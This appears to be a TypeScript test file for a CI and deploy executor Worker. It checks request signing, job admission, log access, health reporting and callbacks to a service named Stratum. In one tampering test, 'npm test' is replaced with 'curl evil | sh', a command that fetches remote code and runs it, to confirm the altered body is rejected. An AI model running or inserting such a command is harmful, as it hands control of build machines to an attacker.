/**
 * The Worker's HTTP surface: `POST /jobs`, `GET /logs/:id`, `GET /health`,
 * with the two Durable Object namespaces replaced by recorders.
 */
import { beforeEach, describe, expect, it } from "vitest";
import type { AdmissionDecision, AdmissionRequest } from "../src/admission";
import { type Env, MAX_DISPATCH_BYTES } from "../src/config";
import type { Job } from "../src/dispatch";
import worker from "../src/index";
import { logSigningInput } from "../src/logs";
import { sendDeployReport, sendReport } from "../src/report";
import { sign } from "../src/signature";
import {
  HEAD_SHA,
  REPO_PASSWORD,
  SECRET,
  STRATUM,
  deployDispatchBody,
  dispatchBody,
} from "./helpers/fixtures";

const EXECUTOR = "https://ci-executor.internal";

let decision: AdmissionDecision;
let submitted: Array<{ jobId: string; request: AdmissionRequest }>;
let accepted: Array<{ jobId: string; job: Job }>;
let calls: string[];
let logs: Map<string, string>;
let env: Env;
let failSubmit = false;
let failBegin = false;

function namespace(stub: object) {
  return { idFromName: (name: string) => name, get: () => stub };
}

beforeEach(() => {
  decision = { decision: "start" };
  failSubmit = false;
  failBegin = false;
  submitted = [];
  accepted = [];
  calls = [];
  logs = new Map();
  env = {
    CI_EXECUTOR_SECRET: SECRET,
    STRATUM_ORIGIN: STRATUM,
    CI_MAX_CONCURRENT_JOBS: "2",
    COORDINATOR: namespace({
      submit: async (jobId: string, request: AdmissionRequest) => {
        submitted.push({ jobId, request });
        calls.push("submit");
        if (failSubmit) throw new Error("coordinator reset");
        return decision;
      },
      release: async () => {
        calls.push("release");
      },
    }),
    JOB: namespace({
      accept: async (jobId: string, job: Job) => {
        accepted.push({ jobId, job });
        calls.push("accept");
        return true;
      },
      begin: async () => {
        calls.push("begin");
        if (failBegin) throw new Error("runner reset");
      },
      discard: async () => {
        calls.push("discard");
      },
    }),
    LOGS: {
      get: async (key: string) => {
        const body = logs.get(key);
        return body === undefined ? null : { body: new Response(body).body };
      },
    },
  } as unknown as Env;
});

async function postJob(body: string, signature?: string | null, extra: HeadersInit = {}) {
  const headers = new Headers({ "Content-Type": "application/json", ...extra });
  const value = signature === undefined ? await sign(SECRET, body) : signature;
  if (value !== null) headers.set("X-Stratum-Signature", value);
  const response = await worker.fetch(
    new Request(`${EXECUTOR}/jobs`, { method: "POST", headers, body }),
    env,
  );
  return {
    status: response.status,
    body: (await response.json()) as { error?: string; code?: string; state?: string },
  };
}

const body = (overrides: Record<string, unknown> = {}) =>
  JSON.stringify(dispatchBody(Date.now(), overrides));

describe("POST /jobs", () => {
  it("stores the job, admits it and starts it", async () => {
    const response = await postJob(body());

    expect(response.status).toBe(202);
    expect(response.body.state).toBe("running");
    // Stored BEFORE admission, so a job promoted from the queue has data.
    expect(calls).toEqual(["accept", "submit", "begin"]);
    expect(accepted[0]?.job.steps.map((step) => step.name)).toEqual(["lint", "test"]);
    expect(submitted[0]?.jobId).toBe(accepted[0]?.jobId);
    expect(submitted[0]?.request.timeoutMs).toBe(1800_000);
  });

  it("discards the stored job, and its token, when admission throws", async () => {
    failSubmit = true;
    const response = await postJob(body());

    expect(response.status).toBe(503);
    expect(response.body.code).toBe("ADMISSION_FAILED");
    // Admission may have saved its decision before it failed, so the slot or
    // queue place is released as well as the stored job discarded.
    expect(calls).toEqual(["accept", "submit", "release", "discard"]);
  });

  it("gives the slot back and discards the job when an admitted job cannot start", async () => {
    failBegin = true;
    const response = await postJob(body());

    expect(response.status).toBe(503);
    expect(response.body.code).toBe("START_FAILED");
    expect(calls).toEqual(["accept", "submit", "begin", "release", "discard"]);
  });

  it("leaves a queued job for the coordinator to start", async () => {
    decision = { decision: "queued", position: 1 };
    const response = await postJob(body());

    expect(response.status).toBe(202);
    expect(response.body.state).toBe("queued");
    expect(calls).toEqual(["accept", "submit"]);
  });

  it("answers 429 and forgets the job when it does not fit", async () => {
    decision = { decision: "refused", reason: "2 job(s) running and 2 queued" };
    const response = await postJob(body());

    expect(response.status).toBe(429);
    expect(response.body).toEqual({ error: "2 job(s) running and 2 queued", code: "AT_CAPACITY" });
    expect(calls).toEqual(["accept", "submit", "discard"]);
  });

  it("verifies the signature before anything is parsed or stored", async () => {
    for (const signature of [null, "sha256=deadbeef", await sign(`${SECRET}x`, body())]) {
      const response = await postJob(body(), signature);
      expect(response.status).toBe(401);
      expect(response.body.code).toBe("INVALID_SIGNATURE");
    }
    // A signed body that is not even JSON gets past the signature and no further.
    expect((await postJob("not json")).status).toBe(400);
    expect(calls).toEqual([]);
  });

  it("refuses a signature over different bytes than were sent", async () => {
    const signed = body();
    const tampered = signed.replace("npm test", "curl evil | sh");
    expect(tampered).not.toBe(signed);
    expect((await postJob(tampered, await sign(SECRET, signed))).status).toBe(401);
  });

  it("refuses a valid signature on a dispatch this executor does not allow", async () => {
    const response = await postJob(body({ job: { instance: "standard-4" } }));
    expect(response.status).toBe(400);
    expect(response.body.code).toBe("INVALID_DISPATCH");
    expect(calls).toEqual([]);
  });

  it("refuses a job that could not finish before its deadline", async () => {
    const response = await postJob(
      body({ deadline: new Date(Date.now() + 10 * 60_000).toISOString() }),
    );
    expect(response.status).toBe(400);
    expect(calls).toEqual([]);
  });

  it("refuses a body over the size limit, by declaration or by length", async () => {
    const huge = body({ diff: "x".repeat(MAX_DISPATCH_BYTES) });
    expect((await postJob(huge)).status).toBe(413);
    const declared = await postJob("{}", undefined, {
      "Content-Length": String(MAX_DISPATCH_BYTES + 1),
    });
    expect(declared.status).toBe(413);
    expect(calls).toEqual([]);
  });

  it("refuses every job when it is not configured, without saying what the secret is", async () => {
    env.CI_MAX_CONCURRENT_JOBS = undefined;
    const response = await postJob(body());
    expect(response.status).toBe(503);
    expect(response.body.error).toContain("CI_MAX_CONCURRENT_JOBS");
    expect(JSON.stringify(response.body)).not.toContain(SECRET);
  });

  it("never echoes the repository token in a refusal", async () => {
    const response = await postJob(body({ job: { instance: "standard-4" } }));
    expect(JSON.stringify(response.body)).not.toContain(REPO_PASSWORD);
  });
});

describe("GET /logs/:checkRunId", () => {
  async function getLog(
    id: string,
    options: { secret?: string; at?: number; signFor?: string } = {},
  ) {
    const timestamp = String(Math.floor((options.at ?? Date.now()) / 1000));
    const signature = await sign(
      options.secret ?? SECRET,
      logSigningInput(options.signFor ?? id, timestamp),
    );
    return worker.fetch(
      new Request(`${EXECUTOR}/logs/${id}`, {
        headers: { "X-Stratum-Timestamp": timestamp, "X-Stratum-Signature": signature },
      }),
      env,
    );
  }

  beforeEach(() => {
    logs.set("logs/chk_lint.log", "lint output\n");
    logs.set("logs/chk_test.log", "test output\n");
  });

  it("serves a log to a request Stratum signed, as inert plain text", async () => {
    const response = await getLog("chk_lint");
    expect(response.status).toBe(200);
    expect(await response.text()).toBe("lint output\n");
    expect(response.headers.get("Content-Type")).toBe("text/plain; charset=utf-8");
    expect(response.headers.get("X-Content-Type-Options")).toBe("nosniff");
    expect(response.headers.get("Cache-Control")).toBe("no-store");
  });

  it("serves nothing to an unsigned request", async () => {
    const response = await worker.fetch(new Request(`${EXECUTOR}/logs/chk_lint`), env);
    expect(response.status).toBe(401);
  });

  it("refuses a signature made for another check run", async () => {
    expect((await getLog("chk_test", { signFor: "chk_lint" })).status).toBe(401);
  });

  it("refuses a signature made with another secret", async () => {
    expect((await getLog("chk_lint", { secret: `${SECRET}x` })).status).toBe(401);
  });

  it("refuses a signature that has aged out, or is dated in the future", async () => {
    expect((await getLog("chk_lint", { at: Date.now() - 10 * 60_000 })).status).toBe(401);
    expect((await getLog("chk_lint", { at: Date.now() + 10 * 60_000 })).status).toBe(401);
  });

  it("answers 404 to a signed request for a run with no log", async () => {
    expect((await getLog("chk_none")).status).toBe(404);
  });

  it("answers an unsigned request the same whether or not the log exists", async () => {
    const present = await worker.fetch(new Request(`${EXECUTOR}/logs/chk_lint`), env);
    const absent = await worker.fetch(new Request(`${EXECUTOR}/logs/chk_none`), env);
    expect(await present.text()).toBe(await absent.text());
    expect(present.status).toBe(absent.status);
  });
});

describe("everything else", () => {
  it("reports health without revealing configuration values", async () => {
    const healthy = await worker.fetch(new Request(`${EXECUTOR}/health`), env);
    expect(healthy.status).toBe(200);
    env.CI_EXECUTOR_SECRET = "tiny-value-9";
    const broken = await worker.fetch(new Request(`${EXECUTOR}/health`), env);
    expect(broken.status).toBe(503);
    expect(await broken.text()).not.toContain("tiny-value-9");
  });

  it("answers 404 for any other path or method", async () => {
    expect((await worker.fetch(new Request(`${EXECUTOR}/jobs`), env)).status).toBe(404);
    expect((await worker.fetch(new Request(`${EXECUTOR}/`), env)).status).toBe(404);
  });
});

describe("reporting to Stratum", () => {
  const JOB = { callbackUrl: `${STRATUM}/api/checks`, headSha: HEAD_SHA };
  const REPORT = {
    checkRunId: "chk_lint",
    status: "passed" as const,
    sequence: 4,
    summary: "Passed in 12s.",
    detailsUrl: `${STRATUM}/api/changes/chg_1/checks/chk_lint/log`,
  };

  function stratum(status: number, payload: unknown = {}) {
    const seen: Array<{ url: string; init: RequestInit }> = [];
    const fetchImpl = async (url: string, init: RequestInit) => {
      seen.push({ url, init });
      return Response.json(payload, { status });
    };
    return { seen, fetchImpl };
  }

  it("POSTs a signed report to the check run's callback, with no credential", async () => {
    const { seen, fetchImpl } = stratum(200);
    expect(await sendReport(SECRET, JOB, REPORT, fetchImpl)).toBe("delivered");

    expect(seen[0]?.url).toBe(`${STRATUM}/api/checks/chk_lint`);
    const sent = String(seen[0]?.init.body);
    expect(JSON.parse(sent)).toEqual({
      checkRunId: "chk_lint",
      headSha: HEAD_SHA,
      status: "passed",
      sequence: 4,
      summary: "Passed in 12s.",
      detailsUrl: REPORT.detailsUrl,
    });
    const headers = new Headers(seen[0]?.init.headers);
    expect(headers.get("X-Stratum-Signature")).toBe(await sign(SECRET, sent));
    expect(headers.get("Authorization")).toBeNull();
    expect(seen[0]?.init.redirect).toBe("manual");
  });

  it.each([
    ["STALE_REVISION", "abort"],
    ["CHECK_SUPERSEDED", "abort"],
    ["CHECK_TERMINAL", "drop"],
    ["CHECK_DEADLINE_EXCEEDED", "drop"],
  ])("treats a 409 %s as %s", async (code, outcome) => {
    const { fetchImpl } = stratum(409, { code });
    expect(await sendReport(SECRET, JOB, REPORT, fetchImpl)).toBe(outcome);
  });

  it("retries a server error and an unreachable Stratum, and drops what will never be accepted", async () => {
    expect(await sendReport(SECRET, JOB, REPORT, stratum(503).fetchImpl)).toBe("retry");
    expect(await sendReport(SECRET, JOB, REPORT, stratum(429).fetchImpl)).toBe("retry");
    expect(await sendReport(SECRET, JOB, REPORT, stratum(401).fetchImpl)).toBe("drop");
    const unreachable = async () => {
      throw new Error("network");
    };
    expect(await sendReport(SECRET, JOB, REPORT, unreachable)).toBe("retry");
  });
});

describe("POST /jobs with a deploy dispatch", () => {
  const DEPLOY_ENV_TOKEN = "cf-deploy-token-VERYSECRET-0123456789";
  let deployAccepted: Array<{ jobId: string; job: Job }>;

  beforeEach(() => {
    deployAccepted = [];
    Object.assign(env, {
      DEPLOY_TARGETS: JSON.stringify({
        prj_app: {
          staging: { credentials: [{ host: "api.cloudflare.com", secret: "DEPLOY_CRED_STAGING" }] },
        },
      }),
      DEPLOY_CRED_STAGING: DEPLOY_ENV_TOKEN,
      DEPLOY_JOB: namespace({
        accept: async (jobId: string, job: Job) => {
          deployAccepted.push({ jobId, job });
          calls.push("deploy-accept");
          return true;
        },
        begin: async () => {
          calls.push("deploy-begin");
        },
        discard: async () => {
          calls.push("deploy-discard");
        },
      }),
    });
  });

  const deployBody = (overrides: Record<string, unknown> = {}) =>
    JSON.stringify(deployDispatchBody(Date.now(), overrides));

  it("goes to the deploy class, never the CI one, and is admitted with priority", async () => {
    const response = await postJob(deployBody());

    expect(response.status).toBe(202);
    expect(calls).toEqual(["deploy-accept", "submit", "deploy-begin"]);
    expect(accepted).toEqual([]);
    expect(deployAccepted[0]?.jobId.startsWith("deploy-")).toBe(true);
    expect(submitted[0]?.jobId).toBe(deployAccepted[0]?.jobId);
    expect(submitted[0]?.request.priority).toBe(true);
    // What the job object is handed names the secret and does not hold it.
    expect(deployAccepted[0]?.job.profile.credentials).toEqual([
      { host: "api.cloudflare.com", secret: "DEPLOY_CRED_STAGING" },
    ]);
    expect(JSON.stringify(deployAccepted[0]?.job)).not.toContain(DEPLOY_ENV_TOKEN);
  });

  it("a CI dispatch is not given priority and still goes to the CI class", async () => {
    await postJob(body());
    expect(calls).toEqual(["accept", "submit", "begin"]);
    expect(submitted[0]?.request.priority).toBeUndefined();
    expect(deployAccepted).toEqual([]);
  });

  it("is refused, and nothing stored, when the executor has no target for it", async () => {
    const response = await postJob(deployBody({ environment: "production" }));
    expect(response.status).toBe(400);
    expect(response.body.code).toBe("INVALID_DISPATCH");
    expect(response.body.error).toContain("no deploy target");
    expect(calls).toEqual([]);
  });

  it("is refused when the secret its target names is not set", async () => {
    Object.assign(env, { DEPLOY_CRED_STAGING: undefined });
    const response = await postJob(deployBody());
    expect(response.status).toBe(400);
    expect(response.body.error).toContain("DEPLOY_CRED_STAGING");
    expect(calls).toEqual([]);
  });

  it("needs the same signature as any dispatch", async () => {
    expect((await postJob(deployBody(), "sha256=deadbeef")).status).toBe(401);
    expect(calls).toEqual([]);
  });

  it("answers 429 and forgets the job when the deploy queue is full", async () => {
    decision = { decision: "refused", reason: "2 job(s) running and 4 deploy job(s) queued" };
    const response = await postJob(deployBody());
    expect(response.status).toBe(429);
    expect(calls).toEqual(["deploy-accept", "submit", "deploy-discard"]);
  });

  it("reports a broken DEPLOY_TARGETS on /health without failing CI's health", async () => {
    Object.assign(env, { DEPLOY_TARGETS: "{not json" });
    const response = await worker.fetch(new Request(`${EXECUTOR}/health`), env);
    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({
      ok: true,
      deploy: { ok: false, reason: "DEPLOY_TARGETS is not valid JSON" },
    });
    // And CI jobs are still accepted.
    expect((await postJob(body())).status).toBe(202);
  });
});

describe("a deploy report", () => {
  it("is one signed POST to the deployment's callback, carrying the outcome and no credential", async () => {
    const requests: Array<{ url: string; init: RequestInit }> = [];
    const outcome = await sendDeployReport(
      SECRET,
      {
        callbackUrl: `${STRATUM}/api/deploy-reports`,
        headSha: HEAD_SHA,
        deploy: { deploymentId: "dep_1", projectId: "prj_app", environment: "staging", env: {} },
      },
      {
        checkRunId: "dep_1",
        status: "passed",
        sequence: 1,
        summary: "All 3 steps passed.",
        detailsUrl: `${STRATUM}/@owner/app/deployments/dep_1`,
        deploy: {
          steps: [{ name: "deploy", status: "passed" }],
          version: "v-123",
          logTail: "ok\n",
        },
      },
      async (url, init) => {
        requests.push({ url, init });
        return new Response("{}", { status: 200 });
      },
    );

    expect(outcome).toBe("delivered");
    expect(requests[0]?.url).toBe(`${STRATUM}/api/deploy-reports/dep_1`);
    const sentBody = String(requests[0]?.init.body);
    expect(JSON.parse(sentBody)).toMatchObject({
      deploymentId: "dep_1",
      commitSha: HEAD_SHA,
      environment: "staging",
      status: "succeeded",
      version: "v-123",
      logTail: "ok\n",
    });
    expect(new Headers(requests[0]?.init.headers).get("X-Stratum-Signature")).toBe(
      await sign(SECRET, sentBody),
    );
    expect(requests[0]?.init.redirect).toBe("manual");
  });

  it("maps a failed or errored job to a failed deployment, saying which", async () => {
    const bodies: string[] = [];
    const send = (status: "failed" | "errored") =>
      sendDeployReport(
        SECRET,
        { callbackUrl: `${STRATUM}/api/deploy-reports`, headSha: HEAD_SHA },
        { checkRunId: "dep_1", status, sequence: 1, detailsUrl: "" },
        async (_url, init) => {
          bodies.push(String(init.body));
          return new Response("{}", { status: 200 });
        },
      );
    await send("failed");
    await send("errored");
    expect(bodies.map((raw) => JSON.parse(raw).status)).toEqual(["failed", "failed"]);
    expect(bodies.map((raw) => JSON.parse(raw).cause)).toEqual(["failed", "errored"]);
  });

  it("retries when Stratum is unreachable or busy, and stops when the row no longer waits", async () => {
    const answer = (status: number) =>
      sendDeployReport(
        SECRET,
        { callbackUrl: `${STRATUM}/api/deploy-reports`, headSha: HEAD_SHA },
        { checkRunId: "dep_1", status: "passed", sequence: 1, detailsUrl: "" },
        async () => new Response("{}", { status }),
      );
    expect(await answer(503)).toBe("retry");
    expect(await answer(429)).toBe("retry");
    expect(await answer(409)).toBe("drop");
    expect(await answer(401)).toBe("drop");
    expect(
      await sendDeployReport(
        SECRET,
        { callbackUrl: `${STRATUM}/api/deploy-reports`, headSha: HEAD_SHA },
        { checkRunId: "dep_1", status: "passed", sequence: 1, detailsUrl: "" },
        async () => {
          throw new Error("network");
        },
      ),
    ).toBe("retry");
  });
});
